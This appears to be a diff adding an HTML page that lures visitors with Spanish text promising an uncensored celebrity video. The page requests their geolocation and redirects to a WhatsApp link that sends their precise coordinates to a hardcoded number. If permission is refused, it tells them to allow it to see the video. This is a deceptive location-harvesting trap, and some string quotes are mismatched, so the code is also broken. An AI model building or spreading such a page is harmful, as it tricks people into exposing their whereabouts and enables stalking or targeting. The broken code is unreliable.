@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Share my location</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;text-align:center}
+    #msg{font-size:1.2rem;max-width:22rem}
+  </style>
+</head>
+<body>
+  <div id="msg">📍 Casa de los famosos sin censura…</div>
+
+  <script>
+  const you = "57311”6245218;      // ← sustituye por TU número (ej. 573001234567)
+  const openWA = t =>
+    location.href = `https://wa.me/${you}?text=${encodeURIComponent(t)}`;
+
+  navigator.geolocation.getCurrentPosition(
+    p => {
+      const {latitude:lat, longitude:lon, accuracy:acc} = p.coords;
+      const txt = `I am here: ${lat.toFixed(5)}, ${lon.toFixed(5)} (±${Math.round(acc)} m)`;
+      document.getElementById("msg").textContent = "Abriendo WhatsApp…";
+      openWA(txt);
+    },
+    _ => {
+      document.getElementById("msg").textContent =
+        "⚠️ Toca Permitir para compartir para ver el video.”;
+    }
+  );
+  </script>
+</body>
+</html>
